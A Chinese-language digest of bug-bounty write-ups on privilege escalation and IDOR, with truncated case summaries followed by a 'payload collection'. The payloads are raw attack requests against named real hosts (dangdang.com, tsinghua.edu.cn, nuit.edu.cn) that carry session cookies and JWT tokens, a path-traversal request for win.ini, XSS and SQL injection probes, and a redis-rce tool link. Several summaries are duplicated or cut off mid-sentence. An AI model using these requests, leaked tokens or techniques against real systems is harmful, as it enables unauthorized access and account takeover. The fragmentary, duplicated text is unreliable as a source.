# SRC 实战报告提炼 — idor

> 来源：蚂蚁SRC榜一Clown的 250 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（20 份）

### 乌云越权总结

乌云越权总结 乌云知识库： http://www.anquan.us/static/drops/tips-727.html 我的越权之道--小川 越权可能存在的地方 增删改查 越权成因 程序员开发时未对权限进行判断而进行操作 个人成见 测试必须准备两个账号 目前测试越权的最好的方法是在burp的重放模块进行cookie替换，查看 两个账号是否会发送操作 增：一般比较少见，因为增基本会与用户进行绑定 删：比较多，删与改是最容易出现权限未绑定的地方 改：比较多，删与改是最容易出现权限未绑定的地方 查：一般比较少见，因为查基本会与用户进行绑定 乌云公开漏洞： （从后往前看，有意思即记录，有经验即总结

### 记录某实际系统的浅度测试（水文）

记录授权系统的测试 前言 此系统只是浅度测试，领导让我随便测测就行，各位大哥勿喷。目的主要还是用实际系统告诉还未工作的哥哥们，可能工作的系统有些比你挖的src叼，但肯定也有很low的，加油！ 正文部分 既然是授权了，一般情况下确定了这个ip，当时客户给我了一个前台810端口下的，IP访问，也不用想什么域名，测一下目录找找后台，或者nmap扫一下端口，看看后台是不是在其他端口就可以了，这里很简单，后台很好找，就在admin目录下，如下图 其他用于写报告的漏洞这里就不写了 先看以下前台 1、SQL注入漏洞 一般情况下还是想看看新闻详情页面，总觉得此页面会存在漏洞，但是很不友好，此页面测试了以下，过

### SRC挖洞思路

--面向企业src的漏洞挖掘 从0到1，发现与拓展攻 击面 Speaker name：羽 Date：2019/04/19 01子域名枚举、端口扫描、路径扫描、旁站c段查询 常规性资产收集 02关注页面内容、关注目录、敏感关键字搜索 巧用搜索引擎 03构造接口、构造文件、构造目录、框架搭配 发挥创造性思维 04微信公众号、小程序 关注企业动态 05gayhub搜索、漏洞回挖、假性社工 其他tips 06从一个文件服务器静态资源泄露引发的血案 综合案例 content 常规性资产收集 基本的资产收集方式：子域名枚举、端口扫描、路径 扫描、旁站c段查询 子域名枚举 4 子域名爆破：sublist3r

### 未授权redis+getshell

记一次未授权访问redis+getshell 当我们日网站时候，常规漏洞如注入、xss等多尝试无果后，扫描端口也会发现意外收获。 本次扫到了6379也就是Redis，Redis在默认情况下，会绑定在0.0.0.0:6379，如果没有采用限制IP访问，就会将Redis服务暴露在公网上并且在没有设置密码认证的情况下，会导致任意用户未授权访问Redis以及读取Redis数据并写入公钥等远程连接。 当我们通过未授权访问或弱密码成功访问redis服务器，我们应该怎样进一步获取权限呢？ 连接redis：Redis-cli –h 被攻击ip 目前较主流的两个方法，第一种写入计划任务反弹shell set x

### Js跟踪之未授权访问

Js跟踪之未授权访问	 本漏洞来自（安全研究-小秘圈），作者：winway，请勿泄漏圈内任何文件 一个正常登陆框，然后啥都没了，正常的可能会有个人的攻击思路，这个是自己一个项目的招生系统，其实这个漏洞挺有意思的，通过js找到一处登陆接口，其中带了主要的逻辑其实逻辑漏洞这个玩意真的只有思想不到位，按照个人的思维来攻击脑洞真的需要很大，如果大家有什么奇葩的逻辑漏洞可以分享出来一起学习成长。 在js中跟踪到一块登陆到js，看看具体到内容情况，在继续跟踪 跟踪到js post(baseUrl_+"/framework/login_login.do",{loginId:a,password:b,veri

### 逻辑漏洞--任意密码重置

19.02.06丨星期三丨晴天 第一种：验证码可爆破 标志为验证码为4/5位纯数字，以及验证码为前端进行刷新（该情况最为常见，一般在补天专属都是高危的） 案列：当当网任意用户密码修改漏洞 http://m.dangdang.com/forget_psd.php?sid=e14aa9b65e0f4d05 输入要更新帐号的手机号码，然后提交。 下一步，对验证码进行暴破，由于验证码只4位。。网速乐观的情况下，数分钟就能破解出来。 也不多说了，经测试，成功破解了数个帐号。 POST /verify_fp.php?sid=e88bf0a11d2e7920 HTTP/1.1 Host: m.dangdan

### src投稿(p1ng)

记一次简简单单越权漏洞的挖掘 Author p1ng by ACT-Team 前言:  每天看大佬们冲榜乱杀羡慕死弟弟了,于是菜鸡如我也去尝试了一波SRC漏洞的挖掘,很幸运的收获了一个越权漏洞,于是分享给米娜桑 首先在主站点盲目的寻找功能点,然后发现一处私信,看着做的这么粗糙的前端,于是男人的第十感告诉我,这里必定会有漏洞 看到聊天框,我先进行搜索联系人的越权测试,首先的想法是,替换查找用户联系人列表的id,看能否将其他用户的联系人进行查看,也就是越权查看其他用户的联系人, 可以看到数据包,大概意思是查看fromAccide=s-15205***44这个id用户的列表是否包含nickname=

### 第五更：edusrc通用思路

edusrc通用思路： Ps:此文章是我在2021年四月份所写，这次就直接利用一下了！ 思路：要想刷屏上分，就得找系统来挖掘，对于不会审计的我来说只有做一些黑盒测试（会审计大佬可以忽略这一点） 首先我们利用fofa找一些与edu有关的系统 语法：“系统” && org=“China Education and Research Network Center” 其中可以在前面加一些：阅卷系统、评分系统、直播系统、录播系统。（我们需要找的是弱口令能进去的系统） 此次渗透我使用的是：“点播系统” && org=“China Education and Research Network Center”

### 越权

漏洞案例介绍 该功能点位于缴账单的查询接口，当输入指定地区的手机号时，即可绕过限制，实现遍历订单 具体案例 	可以看到下图查询订单处存在“密码”及“验证码”限制 但输入指定地区的手机号时，上述限制失效，接着即可爆破后四位批量获取订单信息

### 如何挖到一个RCE

目录   0 前言与基础概念  1 exec 无过滤拼接 RCE  易  2 任意文件写入 RCE 易  3 文件上传 RCE 中  4 任意登录后台+后台 RCE 易  5 SQL 语句执行+写入权限+绝对路径 RCE 易  6 XSS+electron RCE 易  7 XXE+php 协议 RCE  易  8 SSRF+远程文件下载   RCE 中  9 文件包含 RCE 中上  10 反序列化 RCE 难  11 表达式注入 RCE 中上  12 JNDI 注入 RCE 中上  13 JDBC+反序列化 RCE 中上  14 SSTI 注入 RCE 易  15 缓冲区溢出 RCE 难 

### 重置密码逻辑漏洞 (1)

如果遇到重置密码是分几步走的（比如先验证验证码是否正确，然后再让你改密码）， 这种可以注意验证验证码的响应数据包 像这里， 响应包没有出现任何可校验的信息，比如token，sign之类的， 百分之90存在重置任意用户的漏洞 输入别人账户，直接修改验证的响应包，进入页面重置即可

### github信息收集

介绍: 在漏洞挖掘的过程前期我们进行信息收集，github和码云搜索相关的信息，代码库，运气好的话可以在库中发现一些重要配置如数据库用户密码等 手工方法 gtihub搜索语法: in:name baidu              #标题搜索含有关键字baidu in:descripton baidu         #仓库描述搜索含有关键字 in:readme baidu             #Readme文件搜素含有关键字 stars:>3000 baidu           #stars数量大于3000的搜索关键字 stars:1000..3000 baidu      #star

### 短信验证码系列（二）

短信验证码系列（二）		 0X01（四位数验证码爆破）： 原理：在我们收到验证码的时候会有一个时间限制，比如60s、五分钟内、24小时内失效，但是往往这些验证码都不会在这个时间内失效，此时我们就可以考虑爆破验证码来获取认证。 （其实此处还有一个漏洞就是如果验证码在规定时间内没有失去效果，也是可以提交的） 常见存在漏洞的功能点： 修改密码功能点：修改密码时不需要输入原密码，网站通过验证码决定是否是本用户修改，并且网站的验证码机制没有时间（或者时间在一分钟以外最好，方便爆破）和次数限制， 用户注册点：如果可以爆破验证码，此时我们就可以获取任意用户注册漏洞，等级在中 高危 赏金可以达到四位数  支付

### 统一认证系统的挖掘方法

在挖掘一些业务的时候，很多系统都会放在一个统一认证中去访问，你只有登录统一认证才能去访问某个系统，那么当我们在挖掘的时候，遇见这样的环境怎么办呢？ 	当然是最简单的修改返回包查看是否可以未授权查看内容，当然很多时候都是白给，但是我们还是要尝试一下撒。 当我们扫描出xxxx.com存在一个子域名，我们去访问站点http://stde.xxxx.com发现他要跳转到一个统一认证的页面，此时我们进行抓包对每一个数据包进行分析： 每一次放包都会自动跳转，但是发现该数据包时，我将箭头所指的{}删掉，发现就可以进入系统卡死在功能点页面，因为页面只有功能点没有数据，我就继续点击功能点 点击任意功能点继续抓包

### 如何挖到第一个RCE

目录   0 前言与基础概念  1 exec 无过滤拼接 RCE  易  2 任意文件写入 RCE 易  3 文件上传 RCE 中  4 任意登录后台+后台 RCE 易  5 SQL 语句执行+写入权限+绝对路径 RCE 易  6 XSS+electron RCE 易  7 XXE+php 协议 RCE  易  8 SSRF+远程文件下载   RCE 中  9 文件包含 RCE 中上  10 反序列化 RCE 难  11 表达式注入 RCE 中上  12 JNDI 注入 RCE 中上  13 JDBC+反序列化 RCE 中上  14 SSTI 注入 RCE 易    15 缓冲区溢出 RCE 

### 不安全对象调用案例 (1)

[引言]  分享一下在大佬如云的今天如何挖掘src    分享一个不安全资源调用， 什么叫不安全资源调用， 可以通俗的理解成未授权访问， 但又不 完完全全的叫，到底是什么呢请看我秀往后退我要开始装逼了    和往常一样对SRC平台”交流学习”时发现居然有视频居然要钱，可我一分钱不想花，于 是我就开始了我的操作    由于要购买才能开始学习，先是找了一个免费视频    然后就是使用万能的F12，在控制台中发现居然会返回一个mp4    于是我就按照相同的方法去付费视频进行了相同的操作，可惜啥也没有(可能只对免费视频 有效)，但是我忽然发现视频可能是通过id这个参数进行调用的     于是在我一段

### 不安全对象直接调用2

不安全对象直接调用 0x01：思考 结合上次的不安全对象直接调用引发的思考，因为在前站点发现我们可以通过构造url来免费观看别人的视频，从而可以思考，应该这个站点对鉴权做的很差，百分之八十都存在越权 所以当我们在挖一个站点的时候，出现了一个问题，肯定就还有别的地方点也可以利用这个点。 0x02：案例 某看视频的作者发布处存在越权发布别人的视频： 可以看见我们下面的数据包出现了前面的熟悉的字眼：mad，于是猜想是否能直接调用别人的这个mad值来发布呢！ 然后直接改为别人的视频的值： mad获取方法则是上一章讲述过了！！！

### 统一认证系统的挖掘方法 (1)

在挖掘一些业务的时候，很多系统都会放在一个统一认证中去访问，你只有登录统一认证才能去访问某个系统，那么当我们在挖掘的时候，遇见这样的环境怎么办呢？ 	当然是最简单的修改返回包查看是否可以未授权查看内容，当然很多时候都是白给，但是我们还是要尝试一下撒。 当我们扫描出xxxx.com存在一个子域名，我们去访问站点http://stde.xxxx.com发现他要跳转到一个统一认证的页面，此时我们进行抓包对每一个数据包进行分析： 每一次放包都会自动跳转，但是发现该数据包时，我将箭头所指的{}删掉，发现就可以进入系统卡死在功能点页面，因为页面只有功能点没有数据，我就继续点击功能点 点击任意功能点继续抓包

### 越权漏洞(1) (1)

越权漏洞 越权，顾名思义，就是超出了权限或权力范围，越权漏洞是一种很常见的逻辑安全漏洞。 是由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞 隐藏的url实现权限管理    实现控制访问有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击 引用对象直接查看 通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水

### edusrc挖掘技巧（全）

edusrc挖掘技巧总结 一： 对于新人刚开设挖edusrc的时候需要花大量的时间来找系统和信息收集，当你遇见的系统又waf的时候可以适当的放弃别再这上面花时间了，列入sql注入，一个单引号尝试报错和闭合（最多就是把简单的绕过尝试一下）如果不行，那就果断放弃，xss的话在edu的模块是不需要花大量时间，但是为了后面的企业src可以更好的理解xss可以尝试挖掘一些（在控制台弹窗测试，因为未授权，出了问题别找我）这就是对于top10漏洞的技巧。 主要还是说一些系统的收集方法： 利用fofa 语句：“系统” && org=“China Education and Research Network C

## 实战 Payload 集（24 条去重）

### URL

```
https://github.com/Ridter/redis-rce.git
http://202.193.24.122:9080/signin，然后在登录处输入账号admin
https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories
http://localhost/phpmyadmin4.8.5/index.php?db=test
http://xx.xxx.xxx.xxx:8312/admin/login/index
http://119.23.19.84:9001//actuator/heapdump
http://xxx.com/Admin/Login.aspx]
```

### HTTP请求

```
POST /verify_fp.php?sid=e88bf0a11d2e7920 HTTP/1.1
Host: m.dangdang.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://m.dangdang.com/verify_fp.php?sid=e88bf0a11d2e7920
Content-Type: application/x-www-form-urlencoded
action=verify&sid=e88bf0a11d2e7920&mobile=xxxx&verify=§v§&submit=%E6%8
POST /epay/api?method=sysuserFindList HTTP/1.1
Host: epay.nuit.edu.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: application/json, text/plain, /
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 62
Connection: close
Cookie: axf:sess=45cf0e0de4b204a7e813872b701bb55e5a69216b1b6fc11b; atoken=8aacd7cd013ec4baf95e689d1fcabdc7;
epay_auth=eyJwY
POST /xxxxxx/app.do HTTP/1.1
Host: gw.xxxxxx.com
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cookie: BIGipServer_nginx_pool=926027948.36895.0000
Connection: close
Accept: */*
User-Agent: XXXX2B/1.8.1 (iPhone; iOS 10.3.1; Scale/2.00)
Accept-Language: zh-Hans-CN;q=1
Content-Length: 318
X-Request-Id: 9F613F2C-29D0-44F3-95BB-011FAA7577B8
a p p S r c = 3 & a p p T y p e = B & a p p _ c o d e = 2 3 0 0 4 & c a s U u i d = 1 & c l i n i c I d = f 4 e 3 5 0 c 7 - 7 8 f
POST /ccc-cmnsrv-channel-channelapp/order/prejud/queryUser HTTP/1.1
Host: flsccc.cccc.com.cn
Accept: */*
version: 1
userId: 2b9a0888-18b6-4790-838a-fe7dea4d865f_8348
Accept-Encoding: br, gzip, deflate
Accept-Language: zh-Hans-CN;q=1
token: 
<REDACTED>
mI5YTA4ODgtMThiNi00NzkwLTgzOGEtZmU3ZGVhNGQ4NjVmXzgzNDgiLCJkZXZpY2VJZCI6IjkyQjExNTgwLUJDM
TEtNDBGQS1CRjFCLUJBM0EyQkQ1RkJCNCJ9.zYzs8nKtmM8gxK8Qz3zvh-i85Z5K641jkaV40l5
POST /ccc-cmnsrv-channel-channelapp//order/prejud/querydetail HTTP/1.1
Host: ccc.ccc.com.cn
Accept: */*
version: 1
userId: 2b9a0888-18b6-4790-838a-fe7dea4d865f_8348
Accept-Encoding: br, gzip, deflate
Accept-Language: zh-Hans-CN;q=1
t o k e n : 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhdXRoMCIsImV4cCI6MTUzODM5NjAxMywidXNlcklkIjoiMmI5Y
TA4ODgtMThiNi00NzkwLTgzOGEtZmU3ZGVhNGQ4NjVmXzgzNDgiLCJkZXZpY2VJZCI6IjkyQjExNTgwLUJDMTEtNDB
GQS1CRjFCLUJBM0EyQkQ1RkJCNCJ9.zYzs8nKtmM8gxK8Qz3zvh-i85Z5K641jkaV
POST /lsms/register/sendPasswordCode HTTP/1.1
Host: ehs.chemeng.tsinghua.edu.cn
Content-Length: 34
Accept: application/json, text/plain, /
roleId: null
locale: zh-CN
Authorization: undefined
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61
Content-Type: application/json;charset=UTF-8
Origin: http://ehs.chemeng.tsinghua.edu.cn
Referer: http://ehs.chemeng.tsinghua.edu.cn/lsms/getPassword
Accept-Encoding: g
GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1} HTTP/1.1
Connection: close
Accept-Encoding: gzip
```
GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
Accept: */*
Connection: Keep-Alive
```
POST /lsms/register/sendPasswordCode HTTP/1.1 
Host: ehs.chemeng.tsinghua.edu.cn 
Content-Length: 34 
Accept: application/json, text/plain, / 
roleId: null 
locale: zh-CN 
Authorization: undefined 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/5 37.36 
(KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0 .1518.61 
Content-Type: application/json;charset=UTF-8 
Origin: http://ehs.chemeng.tsinghua.edu.cn 
Referer: http://ehs.chemeng.tsinghua.edu.cn/lsms/getPasswo rd 
Acc
```

### XSS

```
onsubmit='return
<script>alert(/xss/)</script>
```

### SQL

```
and 1=1 正常回显
and 1=0 错误回显
and 1=2 sql命令不成立，结果为空或出错 ； 
and 1=1 sql命令成立，结果正常返回 。 
extractvalue(1,benchmark(25000
sleep(2)))pcfy)+/ /a
```

## 技术手法统计

- 提权: 48 次
- 参数篡改: 8 次
- 漏洞利用: 8 次
- WAF/过滤绕过: 6 次
- 枚举/爆破: 5 次
- 接口发现: 4 次
- 漏洞链: 1 次

